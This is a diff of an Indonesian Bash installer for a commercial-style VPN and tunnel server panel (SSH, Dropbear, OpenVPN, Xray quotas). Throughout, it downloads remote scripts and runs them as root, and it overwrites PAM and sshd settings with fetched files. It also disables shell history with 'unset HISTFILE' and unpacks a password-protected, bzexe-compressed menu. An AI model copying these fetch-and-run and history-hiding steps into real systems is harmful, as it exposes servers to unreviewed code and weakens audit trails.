-    cat > /etc/systemd/system/rc-local.service <<-END
-[Unit]
-Description=/etc/rc.local
-ConditionPathExists=/etc/rc.local
-[Service]
-Type=forking
-ExecStart=/etc/rc.local start
-TimeoutSec=0
-StandardOutput=tty
-RemainAfterExit=yes
-SysVStartPriority=99
-[Install]
-WantedBy=multi-user.target
-END
-    if [ $? -eq 0 ]; then
-        print_success "File rc-local.service."
-    else
-        print_error "Gagal membuat/mengedit file rc-local.service."
-        # exit 1 # Aktifkan jika ini adalah error fatal
-    fi
-
-    # Membuat atau Mengedit file /etc/rc.local
-    print_install "Mengkonfigurasi /etc/rc.local"
-    cat > /etc/rc.local <<-END
-#!/bin/sh -e
-# rc.local
-# By default this script does nothing.
-exit 0
-END
-    if [ $? -eq 0 ]; then
-        chmod +x /etc/rc.local
-        print_success "File /etc/rc.local."
-    else
-        print_error "Gagal membuat/mengedit file /etc/rc.local."
-        # exit 1 # Aktifkan jika ini adalah error fatal
-    fi
-
-    # Mengaktifkan dan Memulai rc-local.service
-    print_install "Mengaktifkan dan Memulai rc-local.service"
-    systemctl enable rc-local &>/dev/null
-    systemctl start rc-local.service &>/dev/null
-    if systemctl is-active --quiet rc-local.service; then
-        print_success "rc-local.service."
-    else
-        print_error "Gagal mengaktifkan atau memulai rc-local.service."
-    fi
-
-    # Menonaktifkan IPv6
-    print_install "Menonaktifkan IPv6"
-    echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
-    if [ $? -eq 0 ]; then
-        sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
-        print_success "IPv6."
-    else
-        print_error "Gagal menonaktifkan IPv6."
-    fi
-
-    # Setel Zona Waktu ke GMT +7 (Asia/Jakarta)
-    print_install "Menyetel Zona Waktu ke Asia/Jakarta"
-    ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
-    if [ $? -eq 0 ]; then
-        print_success "Zona Waktu disetel ke Asia/Jakarta."
-    else
-        print_error "Gagal menyetel Zona Waktu."
-    fi
-
-    # Nonaktifkan AcceptEnv di sshd_config
-    print_install "Mengamankan konfigurasi SSH (sshd_config)"
-    sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
-    if [ $? -eq 0 ]; then
-        print_success "Pengaturan AcceptEnv di sshd_config berhasil dinonaktifkan."
-    else
-        print_error "Gagal menonaktifkan pengaturan AcceptEnv di sshd_config."
-    fi
-
-    echo ""
-    echo -e "${GRAY}----------------------------------------------------------${NC}"
-    echo -e "           Konfigurasi SSH Selesai"
-    echo -e "${GRAY}----------------------------------------------------------${NC}"
-    echo ""
-}
-
-function limit_quota(){
-    echo -e ""
-clear
-    echo -e "${GRAY}----------------------------------------------------------${NC}"
-    echo -e "             Memulai Pengaturan Batas Kuota"
-    echo -e "${GRAY}----------------------------------------------------------${NC}"
-    echo ""
-
-    print_install "Memasang Skrip Batas Kuota"
-    # Unduh dan atur izin untuk skrip 'quota'
-    wget -q -O /usr/local/sbin/quota "https://raw.githubusercontent.com/jaka2m/vip/main/limit/quota"
-    if [ $? -eq 0 ]; then
-        chmod +x /usr/local/sbin/quota
-        # Menghapus karakter Carriage Return (CR) jika ada (dari unduhan Windows)
-        sed -i 's/\r//' /usr/local/sbin/quota
-        print_success "Skrip 'quota' di /usr/local/sbin/."
-    else
-        print_error "Gagal mengunduh skrip 'quota'."
-        # exit 1 # Aktifkan jika ini adalah error fatal
-    fi
-
-    print_install "Memasang Skrip Batas IP"
-    # Unduh dan atur izin untuk skrip 'limit-ip'
-    wget -q -O /usr/bin/limit-ip "https://raw.githubusercontent.com/jaka2m/vip/main/limit/limit-ip"
-    if [ $? -eq 0 ]; then
-        chmod +x /usr/bin/limit-ip
-        # Menghapus karakter Carriage Return (CR) jika ada
-        sed -i 's/\r//' /usr/bin/limit-ip
-        print_success "Skrip 'limit-ip' di /usr/bin/."
-    else
-        print_error "Gagal mengunduh skrip 'limit-ip'."
-        # exit 1 # Aktifkan jika ini adalah error fatal
-    fi
-
-    clear
-
-    # --- Konfigurasi Layanan Systemd untuk Batas IP (LIMIT ALL IP) ---
-    print_install "Mengkonfigurasi Layanan Batas IP (vmip, vlip, trip)"
-
-    # Layanan untuk VMESS IP Limit
-    cat >/etc/systemd/system/vmip.service << EOF
-[Unit]
-Description=Layanan Batas IP VMESS Geo Project
-After=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip vmip
-Restart=always
-
 [Install]
 WantedBy=multi-user.target
 EOF
-    systemctl daemon-reload
-    systemctl enable vmip &>/dev/null
-    systemctl restart vmip &>/dev/null
-    if systemctl is-active --quiet vmip; then
-        print_success "Layanan vmip."
-    else
-        print_error "Gagal mengkonfigurasi atau memulai layanan vmip."
-    fi
-
-    # Layanan untuk VLESS IP Limit
-    cat >/etc/systemd/system/vlip.service << EOF
-[Unit]
-Description=Layanan Batas IP VLESS Geo Project
-After=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip vlip
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-    systemctl daemon-reload
-    systemctl enable vlip &>/dev/null
-    systemctl restart vlip &>/dev/null
-    if systemctl is-active --quiet vlip; then
-        print_success "Layanan vlip dikonfigurasi dan dimulai."
-    else
-        print_error "Gagal mengkonfigurasi atau memulai layanan vlip."
-    fi
-
-    # Layanan untuk TROJAN IP Limit
-    cat >/etc/systemd/system/trip.service << EOF
-[Unit]
-Description=Layanan Batas IP TROJAN Geo Project
-After=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip trip
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-    systemctl daemon-reload
-    systemctl enable trip &>/dev/null
-    systemctl restart trip &>/dev/null
-    if systemctl is-active --quiet trip; then
-        print_success "Layanan trip dan dimulai."
-    else
-        print_error "Gagal mengkonfigurasi atau memulai layanan trip."
-    fi
-
-    # --- Konfigurasi Layanan Systemd untuk Batas Kuota (SERVICE LIMIT QUOTA) ---
-    print_install "Mengkonfigurasi Layanan Batas Kuota (vmess, vless, trojan)"
-
-    # Layanan untuk Kuota VMESS
-    cat >/etc/systemd/system/qmv.service << EOF
-[Unit]
-Description=Layanan Batas Kuota VMESS Geo Project
-After=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota vmess
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-    systemctl daemon-reload
-    systemctl enable qmv &>/dev/null
-    systemctl restart qmv &>/dev/null
-    if systemctl is-active --quiet qmv; then
-        print_success "Layanan qmv (kuota VMESS) berhasil dikonfigurasi dan dimulai."
-    else
-        print_error "Gagal mengkonfigurasi atau memulai layanan qmv."
-    fi
-
-    # Layanan untuk Kuota VLESS
-    cat >/etc/systemd/system/qmvl.service << EOF
-[Unit]
-Description=Layanan Batas Kuota VLESS Geo Project
-After=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota vless
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-    systemctl daemon-reload
-    systemctl enable qmvl &>/dev/null
-    systemctl restart qmvl &>/dev/null
-    if systemctl is-active --quiet qmvl; then
-        print_success "Layanan qmvl (kuota VLESS) dan dimulai."
-    else
-        print_error "Gagal mengkonfigurasi atau memulai layanan qmvl."
-    fi
-
-    # Layanan untuk Kuota TROJAN
-    cat >/etc/systemd/system/qmtr.service << EOF
-[Unit]
-Description=Layanan Batas Kuota TROJAN Geo Project
-After=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/local/sbin/quota trojan
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-    systemctl daemon-reload
-    systemctl enable qmtr &>/dev/null
-    systemctl restart qmtr &>/dev/null
-    if systemctl is-active --quiet qmtr; then
-        print_success "Layanan qmtr (kuota TROJAN) dan dimulai."
-    else
-        print_error "Gagal mengkonfigurasi atau memulai layanan qmtr."
-    fi
-
-    echo ""
-    echo -e "${GRAY}----------------------------------------------------------${NC}"
-    echo -e "            Pengaturan Batas Kuota Selesai"
-    echo -e "${GRAY}----------------------------------------------------------${NC}"
-    echo ""
-}
-
-function udp_mini(){
 echo -e ""
+print_success "CONFIGURASI PACKAGES"
+}
+function ssh(){
+clear
+print_install "MEMASANG PASSWORD SSH"
+wget ${GEO_VPN}menu/rc_local && bash rc_local
+wget -O /etc/pam.d/common-password "${GEO_VPN}ssh/password"
+chmod +x /etc/pam.d/common-password
+DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
+echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
+sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
+ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+echo -e ""
+print_success "PASSWORD SSH"
+}
+function ins_dropbear(){
+clear
+print_install "MENGINSTALL DROPBEAR"
+if ! command -v wget &> /dev/null
+then
+print_error "Wget tidak ditemukan. Memasang wget..."
+apt-get update && apt-get install -y wget
+fi
+wget -q -O /etc/default/dropbear "${GEO_VPN}ssh/dropbear.conf"
+chmod +x /etc/default/dropbear
+if ! grep -q "Banner /etc/geovpn.txt" /etc/ssh/sshd_config; then
+echo "Banner /etc/geovpn.txt" >> /etc/ssh/sshd_config
+fi
+sed -i.bak 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/geovpn.txt"@g' /etc/default/dropbear
+wget -O /etc/geovpn.txt "${GEO_VPN}ssh/issue.net"
+local OS_ID=$(grep -oP '(?<=^ID=).+' /etc/os-release | tr -d '"')
+local OS_VERSION_ID=$(grep -oP '(?<=^VERSION_ID=).+' /etc/os-release | tr -d '"')
+if [ "$OS_ID" == "ubuntu" ] && [ "$OS_VERSION_ID" == "24.04" ]; then
+print_install "Membersihkan tag HTML dari banner Dropbear untuk Ubuntu 24.04..."
+sed -i 's/<[^>]*>//g' /etc/geovpn.txt
+sed -i '/^\s*$/d' /etc/geovpn.txt
+print_success "Tag HTML berhasil dibersihkan."
+fi
+systemctl restart dropbear &> /dev/null
+if [ $? -ne 0 ]; then
+/etc/init.d/dropbear restart &> /dev/null
+fi
+systemctl status dropbear --no-pager &> /dev/null
+if [ $? -ne 0 ]; then
+/etc/init.d/dropbear status &> /dev/null
+fi
+sleep 2
+print_success "DROPBEAR"
+}
+function udp_mini(){
 clear
 print_install "MEMASANG UDP MINI"
 mkdir -p /usr/local/geovpn/
-wget -q -O /usr/local/geovpn/udp-mini "https://raw.githubusercontent.com/jaka2m/vip/main/badvpn/udp-mini"
+wget -q -O /usr/local/geovpn/udp-mini "${GEO_VPN}badvpn/udp-mini"
 chmod +x /usr/local/geovpn/udp-mini
-wget -q -O /etc/systemd/system/udp-mini-1.service "https://raw.githubusercontent.com/jaka2m/vip/main/badvpn/udp-mini-1.service"
-wget -q -O /etc/systemd/system/udp-mini-2.service "https://raw.githubusercontent.com/jaka2m/vip/main/badvpn/udp-mini-2.service"
-wget -q -O /etc/systemd/system/udp-mini-3.service "https://raw.githubusercontent.com/jaka2m/vip/main/badvpn/udp-mini-3.service"
+wget -q -O /etc/systemd/system/udp-mini-1.service "${GEO_VPN}badvpn/udp-mini-1.service"
+wget -q -O /etc/systemd/system/udp-mini-2.service "${GEO_VPN}badvpn/udp-mini-2.service"
+wget -q -O /etc/systemd/system/udp-mini-3.service "${GEO_VPN}badvpn/udp-mini-3.service"
 systemctl disable udp-mini-1
 systemctl stop udp-mini-1
 systemctl enable udp-mini-1
@@ -1122,15 +865,13 @@ systemctl start udp-mini-3
 echo ""
 print_success "UDP MINI"
 }
-
 function ssh_udp(){
-echo -e ""
 clear
 print_install "MEMASANG SSH UDP"
 mkdir -p /etc/geovpn/
-wget -q -O /etc/geovpn/udp "https://raw.githubusercontent.com/jaka2m/vip/main/udp/udp"
-wget -q -O /etc/systemd/system/udp.service "https://raw.githubusercontent.com/jaka2m/vip/main/udp/udp.service"
-wget -q -O /etc/geovpn/config.json "https://raw.githubusercontent.com/jaka2m/vip/main/udp/config.json"
+wget -q -O /etc/geovpn/udp "${GEO_VPN}ssh/udp"
+wget -q -O /etc/systemd/system/udp.service "${GEO_VPN}ssh/udp.service"
+wget -q -O /etc/geovpn/config.json "${GEO_VPN}ssh/config.json"
 chmod +x /etc/geovpn/udp
 chmod +x /etc/systemd/system/udp.service
 chmod +x /etc/geovpn/config.json
@@ -1139,175 +880,142 @@ systemctl start udp
 systemctl restart udp
 systemctl status udp --no-pager
 }
-
-#function ssh_slow(){
-#clear
-#print_install "Memasang modul SlowDNS Server"
-#    wget -q -O /tmp/nameserver "https://raw.githubusercontent.com/jaka2m/vip/main/slowdns/nameserver" >/dev/null 2>&1
- #   chmod +x /tmp/nameserver
-  #  bash /tmp/nameserver | tee /root/install.log
-# print_success "SlowDNS"
-#}
-
 clear
-function ins_SSHD(){
-echo -e ""
+function ins_sshd(){
 clear
-print_install "Memasang SSHD"
-wget -q -O /etc/ssh/sshd_config "https://raw.githubusercontent.com/jaka2m/vip/main/ws/sshd" >/dev/null 2>&1
+print_install "MEMASANG SSHD"
+wget -q -O /etc/ssh/sshd_config "${GEO_VPN}ws/sshd" >/dev/null 2>&1
 chmod 700 /etc/ssh/sshd_config
 /etc/init.d/ssh restart
 systemctl restart ssh
-/etc/init.d/ssh status
+systemctl status ssh --no-pager
 print_success "SSHD"
 }
-
-clear
-function ins_dropbear(){
-echo -e ""
-clear
-print_install "MENGINSTALL DROPBEAR"
-if ! command -v wget &> /dev/null
-then
-print_error "Wget tidak ditemukan. Memasang wget..."
-apt-get update && apt-get install -y wget
-fi
-wget -q -O /etc/default/dropbear "https://raw.githubusercontent.com/jaka2m/vip/main/ssh/dropbear.conf"
-chmod +x /etc/default/dropbear
-if ! grep -q "Banner /etc/geovpn.txt" /etc/ssh/sshd_config; then
-echo "Banner /etc/geovpn.txt" >> /etc/ssh/sshd_config
-fi
-sed -i.bak 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/geovpn.txt"@g' /etc/default/dropbear
-wget -O /etc/geovpn.txt "https://raw.githubusercontent.com/jaka2m/vip/main/ssh/issue.net"
-local OS_ID=$(grep -oP '(?<=^ID=).+' /etc/os-release | tr -d '"')
-local OS_VERSION_ID=$(grep -oP '(?<=^VERSION_ID=).+' /etc/os-release | tr -d '"')
-if [ "$OS_ID" == "ubuntu" ] && [ "$OS_VERSION_ID" == "24.04" ]; then
-print_install "Membersihkan tag HTML dari banner Dropbear untuk Ubuntu 24.04..."
-sed -i 's/<[^>]*>//g' /etc/geovpn.txt
-sed -i '/^\s*$/d' /etc/geovpn.txt
-print_success "Tag HTML berhasil dibersihkan."
-fi
-systemctl restart dropbear &> /dev/null
-if [ $? -ne 0 ]; then
-/etc/init.d/dropbear restart &> /dev/null
-fi
-systemctl status dropbear --no-pager
-if [ $? -ne 0 ]; then
-/etc/init.d/dropbear status &> /dev/null
-fi
-sleep 2
-print_success "DROPBEAR"
-}
-
-clear
 function ins_vnstat(){
-echo -e ""
 clear
-print_install "Menginstall Vnstat"
-# setting vnstat
-apt -y install vnstat > /dev/null 2>&1
-/etc/init.d/vnstat restart
-apt -y install libsqlite3-dev > /dev/null 2>&1
-wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
-tar zxvf vnstat-2.6.tar.gz
-cd vnstat-2.6
+print_install "Memulai Instalasi VNSTAT"
+local OS_ID=$(grep -w ID /etc/os-release | head -n1 | sed 's/ID=//g' | sed 's/"//g')
+local OS_VERSION_ID=$(grep -w VERSION_ID /etc/os-release | head -n1 | sed 's/VERSION_ID=//g' | sed 's/"//g' | cut -d'.' -f1)
+echo -e "${BLUE}Mendeteksi OS: ${OS_ID} ${OS_VERSION_ID}${NC}"
+print_install "Menginstal dependensi yang dibutuhkan..."
+sudo apt update -y >/dev/null 2>&1
+if ! sudo apt install -y build-essential libsqlite3-dev vnstat >/dev/null 2>&1; then
+echo -e "${BOLD_RED}ERROR: Gagal menginstal dependensi (build-essential, libsqlite3-dev, vnstat).${NC}"
+echo -e "${BOLD_RED}Pastikan repositori Anda berfungsi atau cek koneksi internet.${NC}"
+return 1
+fi
+print_success "Dependensi berhasil diinstal."
+NET=$(ip route | grep default | awk '{print $5}' | head -n 1)
+if [ -z "$NET" ]; then
+echo -e "${BOLD_RED}ERROR: Gagal mendeteksi antarmuka jaringan utama.${NC}"
+echo -e "${BOLD_RED}Harap set variabel \$NET secara manual sebelum menjalankan skrip ini.${NC}"
+return 1
+fi
+echo -e "${BLUE}Antarmuka jaringan utama terdeteksi: ${NET}${NC}"
+print_install "Mengunduh dan mengkompilasi VNStat versi 2.6..."
+wget -q https://humdi.net/vnstat/vnstat-2.6.tar.gz -O /tmp/vnstat-2.6.tar.gz
+if [ $? -ne 0 ]; then
+echo -e "${BOLD_RED}ERROR: Gagal mengunduh vnstat-2.6.tar.gz. Periksa koneksi internet.${NC}"
+return 1
+fi
+tar zxvf /tmp/vnstat-2.6.tar.gz -C /tmp >/dev/null 2>&1
+cd /tmp/vnstat-2.6
 ./configure --prefix=/usr --sysconfdir=/etc && make && make install
-cd
-vnstat -u -i $NET
-sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
+if [ $? -ne 0 ]; then
+echo -e "${BOLD_RED}ERROR: Gagal mengkompilasi atau menginstal VNStat. Lihat output di atas untuk detail.${NC}"
+cd ~
+rm -rf /tmp/vnstat-2.6.tar.gz /tmp/vnstat-2.6
+return 1
+fi
+cd ~
+print_success "VNStat 2.6 berhasil dikompilasi dan diinstal."
+print_install "Mengkonfigurasi VNStat..."
+vnstat -u -i "$NET"
+if [ $? -ne 0 ]; then
+echo -e "${BOLD_YELLOW}Peringatan: Gagal membuat database VNStat untuk ${NET}. Mungkin sudah ada.${NC}"
+fi
+sed -i "s/Interface \"eth0\"/Interface \"${NET}\"/g" /etc/vnstat.conf
 chown vnstat:vnstat /var/lib/vnstat -R
-systemctl enable vnstat
-/etc/init.d/vnstat restart
-/etc/init.d/vnstat status
-rm -f /root/vnstat-2.6.tar.gz
-rm -rf /root/vnstat-2.6
-print_success "Vnstat"
+print_install "Mengaktifkan dan memulai layanan VNStat..."
+systemctl enable vnstat >/dev/null 2>&1
+systemctl restart vnstat >/dev/null 2>&1
+systemctl status vnstat --no-pager
+print_success "VNSTAT berhasil diinstal dan dikonfigurasi!"
+print_install "Membersihkan file instalasi..."
+rm -f /tmp/vnstat-2.6.tar.gz
+rm -rf /tmp/vnstat-2.6
+print_success "Pembersihan selesai."
 }
-
 function ins_openvpn(){
-echo -e ""
 clear
-print_install "Menginstall OpenVPN"
-#OpenVPN
-wget https://raw.githubusercontent.com/jaka2m/vip/main/ssh/openvpn &&  chmod +x openvpn && ./openvpn
-/etc/init.d/openvpn restart
+print_install "MENGINSTALL OPENVPN"
+wget ${GEO_VPN}ssh/openvpn &&  chmod +x openvpn && ./openvpn
+echo ""
+print_success "OPENVPN"
+}
+function ins_open(){
 rm -f /var/www/html/index.html
-wget -O /var/www/html/index.html "https://raw.githubusercontent.com/jaka2m/vip/main/menu/index.html" >/dev/null 2>&1
-
-print_success "OpenVPN"
+wget -O /var/www/html/index.html "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/menu/index.html" >/dev/null 2>&1
 }
-
-clear
 function ins_swab(){
-echo -e ""
 clear
-print_install "Memasang Swap 1 G"
+print_install "MEMASANG SWAP 1 G"
 gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
-    gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
-    curl -sL "$gotop_link" -o /tmp/gotop.deb
-    dpkg -i /tmp/gotop.deb >/dev/null 2>&1
-    
-        # > Buat swap sebesar 1G
-    dd if=/dev/zero of=/swapfile bs=1024 count=1048576
-    mkswap /swapfile
-    chown root:root /swapfile
-    chmod 0600 /swapfile >/dev/null 2>&1
-    swapon /swapfile >/dev/null 2>&1
-    sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab
-
-    # > Singkronisasi jam
-    chronyd -q 'server 0.id.pool.ntp.org iburst'
-    chronyc sourcestats -v
-    chronyc tracking -v
-    
-    wget https://raw.githubusercontent.com/jaka2m/vip/main/bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
-rm -rf /root/*.sh
-print_success "Swap 1 G"
+gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
+curl -sL "$gotop_link" -o /tmp/gotop.deb
+dpkg -i /tmp/gotop.deb >/dev/null 2>&1
+dd if=/dev/zero of=/swapfile bs=1024 count=1048576
+mkswap /swapfile
+chown root:root /swapfile
+chmod 0600 /swapfile >/dev/null 2>&1
+swapon /swapfile >/dev/null 2>&1
+sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab
+chronyd -q 'server 0.id.pool.ntp.org iburst'
+chronyc sourcestats -v
+chronyc tracking -v
+echo ""
+print_success "SWAP 1 G"
 }
-
-function ins_Fail2ban(){
-echo -e ""
+function ins_bbr(){
 clear
-print_install "Menginstall Fail2ban"
-apt -y install fail2ban > /dev/null 2>&1
-#sudo systemctl enable --now fail2ban
-/etc/init.d/fail2ban restart
-/etc/init.d/fail2ban status
-print_success "Fail2ban"
+print_install "MEMASANG BBR"
+wget ${GEO_VPN}bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
+echo ""
+rm -f bbr.sh
+print_success "BBR"
 }
-
-function DDoS_Deflate(){
-echo -e ""
 clear
-print_install "MEMASANG DDoS-Deflate"
-wget -qO /usr/sbin/ddos.zip "https://raw.githubusercontent.com/jaka2m/vip/main/ssh/ddos.zip" >/dev/null 2>&1
-unzip /usr/sbin/ddos.zip -d /usr/sbin/
-rm -rf /usr/sbin/ddos.zip
-chmod +x /usr/sbin/ddos-deflate-master/*
-cd /usr/sbin/ddos-deflate-master
-./uninstall.sh && ./install.sh
-print_success "DDoS-Deflate"
+function limit_xray(){
+clear
+print_install "MEMASANG LIMIT XRAY"
+wget ${GEO_VPN}limit/limit.sh &&  chmod +x limit.sh && ./limit.sh
+AUTOREB=$(cat /home/daily_reboot)
+SETT=11
+if [ $AUTOREB -gt $SETT ]; then
+TIME_DATE="PM"
+else
+TIME_DATE="AM"
+fi
+print_success "LIMIT XRAY"
 }
-
 function ins_epro(){
-echo -e ""
 clear
-print_install "Menginstall ePro WebSocket Proxy"
-    wget -O /usr/bin/ws "https://raw.githubusercontent.com/jaka2m/vip/main/ws/ws" >/dev/null 2>&1
-    wget -O /usr/bin/tun.conf "https://raw.githubusercontent.com/jaka2m/vip/main/ws/tun.conf" >/dev/null 2>&1
-    wget -O /etc/systemd/system/ws.service "https://raw.githubusercontent.com/jaka2m/vip/main/ws/ws.service" >/dev/null 2>&1
-    chmod +x /etc/systemd/system/ws.service
-    chmod +x /usr/bin/ws
-    chmod 644 /usr/bin/tun.conf
+print_install "MENGINSTALL EPRO WEBSOCKET PROXY"
+wget -O /usr/bin/ws "${GEO_VPN}ws/ws" >/dev/null 2>&1
+wget -O /usr/bin/tun.conf "${GEO_VPN}ws/tun.conf" >/dev/null 2>&1
+wget -O /etc/systemd/system/ws.service "${GEO_VPN}ws/ws.service" >/dev/null 2>&1
+wget -q -O /etc/ipserver "${GEO_VPN}ssh/ipserver" && bash /etc/ipserver >/dev/null 2>&1
+chmod +x /etc/systemd/system/ws.service
+chmod +x /usr/bin/ws
+chmod 644 /usr/bin/tun.conf
 systemctl disable ws
 systemctl stop ws
 systemctl enable ws
 systemctl start ws
 systemctl restart ws
-wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
-wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1
-wget -O /usr/sbin/ftvpn "https://raw.githubusercontent.com/jaka2m/vip/main/ws/ftvpn" >/dev/null 2>&1
-chmod +x /usr/sbin/ftvpn
+systemctl status ws --no-pager
+wget -O /usr/sbin/geovpn "${GEO_VPN}ws/geovpn" >/dev/null 2>&1
+chmod +x /usr/sbin/geovpn
 iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
 iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
 iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
@@ -1323,53 +1031,77 @@ iptables-save > /etc/iptables.up.rules
 iptables-restore -t < /etc/iptables.up.rules
 netfilter-persistent save
 netfilter-persistent reload
-
-# remove unnecessary files
 cd
 apt autoclean -y >/dev/null 2>&1
 apt autoremove -y >/dev/null 2>&1
-print_success "ePro WebSocket Proxy"
-}
-
-function ins_restart(){
 echo -e ""
+print_success "EPRO WEBSOCKET PROXY"
+}
+function ins_restart(){
 clear
-print_install "Restarting  All Packet"
+print_install "RESTARTING  ALL PACKAGES"
+systemctl enable --now nginx
+systemctl enable --now xray
+systemctl enable --now rc-local
+systemctl enable --now openvpn
+systemctl enable --now cron
+systemctl enable --now haproxy
+systemctl enable --now netfilter-persistent
+systemctl enable --now ws
+systemctl enable --now fail2ban
+systemctl enable --now rc-local
+systemctl enable --now cron
+systemctl enable chrony
+systemctl enable --now netfilter-persistent
+systemctl enable client
+systemctl enable server
+systemctl start client
+systemctl start server
+systemctl restart client
+systemctl status client --no-pager
+systemctl restart server
+systemctl status server --no-pager
 /etc/init.d/nginx restart
+systemctl status nginx --no-pager
 /etc/init.d/openvpn restart
+systemctl status openvpn --no-pager
 /etc/init.d/ssh restart
+systemctl status ssh --no-pager
 /etc/init.d/dropbear restart
+systemctl status dropbear --no-pager
 /etc/init.d/fail2ban restart
+systemctl status fail2ban --no-pager
 /etc/init.d/vnstat restart
-systemctl restart haproxy
+systemctl status vnstat --no-pager
 /etc/init.d/cron restart
-    systemctl daemon-reload
-    systemctl start netfilter-persistent
-    systemctl enable --now nginx
-    systemctl enable --now xray
-    systemctl enable --now rc-local
-    systemctl enable --now dropbear
-    systemctl enable --now openvpn
-    systemctl enable --now cron
-    systemctl enable --now haproxy
-    systemctl enable --now netfilter-persistent
-    systemctl enable --now ws
-    systemctl enable --now fail2ban
-history -c
+systemctl status cron --no-pager
+systemctl restart haproxy
+systemctl status haproxy --no-pager
+systemctl daemon-reload
+systemctl restart chronyd
+systemctl status chronyd --no-pager
+systemctl restart chrony
+systemctl status chrony --no-pager
+systemctl daemon-reload
+systemctl start netfilter-persistent
+systemctl restart nginx
+systemctl restart xray
+systemctl status xray --no-pager
+systemctl restart cron
+systemctl start netfilter-persistent
 echo "unset HISTFILE" >> /etc/profile
-
 cd
 rm -f /root/openvpn
 rm -f /root/key.pem
 rm -f /root/cert.pem
-print_success "All Packet"
+echo -e ""
+print_success "ALL PACKAGES"
+clear
 }
-
-#Instal Menu
 function menu(){
 clear
 print_install "MEMASANG MENU PACKAGES"
-wget -O ~/menu.zip "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/menu/menu.zip" >/dev/null 2>&1
+wget -O ~/menu.zip "${GEO_VPN}menu/menu.zip" >/dev/null 2>&1
 mkdir /root/menu
 7z e -psumbawa   ~/menu.zip -o/root/menu/ >/dev/null 2>&1
 chmod +x /root/menu/*
@@ -1378,11 +1110,10 @@ bzexe /usr/local/sbin/* && rm /usr/local/sbin/*~
 echo ""
 print_success "MENU PACKAGES"
 }
-
 function ins_rclone(){
 clear
 print_install "MEMASANG RCLONE"
-wget -q -O /root/ins-rclone.sh "https://raw.githubusercontent.com/jaka2m/project/refs/heads/main/backup/ins-rclone.sh"
+wget -q -O /root/ins-rclone.sh "${GEO_VPN}backup/ins-rclone.sh"
 chmod +x /root/ins-rclone.sh
 ./ins-rclone.sh
 echo ""
@@ -1390,22 +1121,81 @@ rm -f /root/ins-rclone.sh
 print_success "RCLONE"
 }
 
+function profile(){
+clear
+cat >/root/.profile <<EOF
+if [ "$BASH" ]; then
